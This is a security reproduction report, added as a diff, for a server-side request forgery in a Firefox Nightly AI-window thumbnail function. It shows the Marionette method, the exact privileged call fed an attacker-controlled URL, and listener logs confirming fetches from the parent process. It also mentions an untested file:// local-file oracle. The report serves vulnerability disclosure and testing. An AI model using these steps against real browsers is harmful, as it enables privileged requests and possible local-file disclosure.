@@ -1,0 +1,42 @@
+Live reproduction — Smart Window thumbnail SSRF (Finding 01)
+============================================================
+Build:        Mozilla Firefox 157.0a1  (ASAN, linux64-asan-opt)
+BuildID:      20260909083822
+Branch/tree:  mozilla-central, changeset cc7bb49240ffd602a20c65f6b1b93e483cfca45a
+Obtained via: fuzzfetch --target firefox --asan  (official Mozilla CI artifact)
+Env:          Ubuntu 24.04, headless, ASAN_OPTIONS set, MOZ_HEADLESS=1
+
+Method
+------
+Firefox launched: ./firefox -headless -marionette -remote-allow-system-access -profile <profile>
+Driver connects via Marionette, set_context("chrome") => parent process, system principal.
+It calls the EXACT function AIChatContentParent.#handleRequestAssets() invokes on the
+content-supplied items[].thumbnail value:
+
+  const { captureThumbnail } =
+    ChromeUtils.importESModule("moz-src:///browser/components/aiwindow/models/HistoryThumbnails.sys.mjs");
+  await captureThumbnail(<attacker-controlled url>);
+
+A local HTTP listener on 127.0.0.1:8899 records whether the PARENT process fetches the URL.
+
+Result — SSRF confirmed (two independent runs, distinct paths)
+--------------------------------------------------------------
+Run 1 return: moz-page-thumb://thumbnails/?url=http%3A%2F%2F127.0.0.1%3A8899%2Fssrf-from-parent-process&revision=6333
+Run 2 return: moz-page-thumb://thumbnails/?url=http%3A%2F%2F127.0.0.1%3A8899%2Fssrf-final-1788954484&revision=1606
+
+Listener log (parent process issued these GETs):
+2026-09-09T11:36:23.493326 GET /selftest from 127.0.0.1
+2026-09-09T11:40:58.182314 GET /ssrf-from-parent-process from 127.0.0.1
+2026-09-09T11:48:06.205136 GET /ssrf-final-1788954484 from 127.0.0.1
+
+Notes
+-----
+* This exercises the vulnerable sink directly in the parent process. The only step not
+  driven is the IPC transport (AIChatContent:RequestAssets from a compromised privilegedabout
+  content process); the parent handler delivers message data verbatim to #handleRequestAssets
+  with no validation (verified by source review), so this faithfully reproduces the handler's
+  behavior on attacker-supplied IPC data.
+* file:// image-file oracle: attempted; the background-thumbnail capture hung in this headless
+  environment (capture-queue/gfx artifact), so no clean positive local-file disclosure was
+  landed here. The SSRF primitive is confirmed; the local-file oracle remains plausible per the
+  code path but is unproven in this run.
